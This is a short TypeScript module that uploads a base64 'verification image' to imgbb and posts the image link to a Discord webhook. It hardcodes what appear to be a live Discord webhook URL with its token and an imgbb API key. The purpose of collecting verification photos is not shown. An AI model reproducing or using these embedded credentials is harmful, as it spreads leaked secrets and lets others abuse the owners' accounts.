
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1340177670599872582/bysbx8izP7OZVX9RCjvq9o1tMlHalEn-j-xtM96BQ5myq1U1ZD5UFWcL0FInt9hlFEMN';

// ---- STEP 1: Upload to imgbb ----
const IMGBB_API_KEY = "a1b0cc9a32335b441919a0899467c1b5"; // 👈 Replace this with your imgbb api key

const uploadImageToImgbb = async (imageDataBase64: string): Promise<string> => {
  // Remove the data:image/jpeg;base64, prefix if present
  const base64 = imageDataBase64.replace(/^data:image\/\w+;base64,/, "");
  const formData = new FormData();
  formData.append("image", base64);

  const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
    method: "POST",
    body: formData,
  });
  const data = await res.json();
  if (!data.success) throw new Error("Failed to upload image to imgbb");
  return data.data.url;
};

// ---- STEP 2: Send the img link to Discord ----
export const sendImageToDiscord = async (imageData: string): Promise<void> => {
  // 1. Upload image and get link
  const imageUrl = await uploadImageToImgbb(imageData);

  // 2. Send the image URL to Discord webhook as a message
  const content = `New verification image: ${imageUrl}`;
  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content }),
  });

  if (!res.ok) {
    throw new Error("Failed to send image URL to Discord");
  }
};
